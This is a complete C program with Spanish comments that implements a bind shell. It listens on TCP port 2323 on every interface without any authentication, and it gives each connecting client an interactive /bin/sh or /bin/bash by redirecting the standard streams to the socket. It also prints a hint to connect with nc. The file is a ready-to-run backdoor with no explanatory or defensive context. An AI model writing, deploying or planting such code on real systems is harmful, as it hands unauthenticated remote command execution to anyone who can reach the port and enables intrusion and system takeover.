#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    int server_fd, client_fd;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    pid_t pid;

    // Crear socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Configurar para reutilizar puerto
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY; // Escuchar en todas las interfaces
    address.sin_port = htons(2323);

    // Bind
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    // Escuchar
    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    printf("[+] Escuchando en puerto TCP 2323\n");
    printf("[+] Conectate con: nc <IP> 2323\n");

    while (1) {
        // Aceptar conexión
        if ((client_fd = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            perror("accept");
            continue;
        }

        printf("[+] Conexión aceptada de %s\n", inet_ntoa(address.sin_addr));

        // Crear proceso hijo
        pid = fork();
        
        if (pid == 0) {
            // Proceso hijo: redirigir stdin, stdout, stderr al socket
            dup2(client_fd, 0);  // stdin
            dup2(client_fd, 1);  // stdout
            dup2(client_fd, 2);  // stderr
            
            // Ejecutar shell
            execl("/bin/sh", "sh", NULL);
            // Si falla, intentar con bash
            execl("/bin/bash", "bash", NULL);
            
            perror("execl failed");
            exit(EXIT_FAILURE);
        } else if (pid > 0) {
            // Proceso padre: cerrar el socket del cliente y seguir escuchando
            close(client_fd);
        } else {
            perror("fork failed");
            close(client_fd);
        }
    }

    close(server_fd);
    return 0;
}
